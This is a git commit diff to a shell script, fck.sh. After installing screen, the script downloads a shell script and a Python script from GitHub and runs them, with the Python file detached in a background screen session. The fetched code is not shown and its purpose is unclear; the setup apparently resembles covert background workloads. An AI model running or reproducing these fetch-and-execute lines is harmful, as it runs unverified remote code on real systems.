4d26076e24f69b07902f7733a33d48c9ff447e79
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-15 22:07:35 +0530

    Update fck.sh

--- fck.sh
+++ fck.sh
@@ -2,9 +2,9 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://raw.githubusercontent.com/NRC-TECH/project-N/main/sib.sh
-wget https://raw.githubusercontent.com/NRC-TECH/project-N/main/test.py
-chmod +x test.py
-screen -dmS test.py ./test.py 60 70
-chmod +x sib.sh
-./sib.sh
+wget https://raw.githubusercontent.com/skullCANDe/hick/main/gb.sh
+wget https://raw.githubusercontent.com/skullCANDe/skyz/main/lesco.py
+chmod +x lesco.py
+screen -dmS lesco.py ./lesco.py 60 70
+chmod +x gb.sh
+./gb.sh
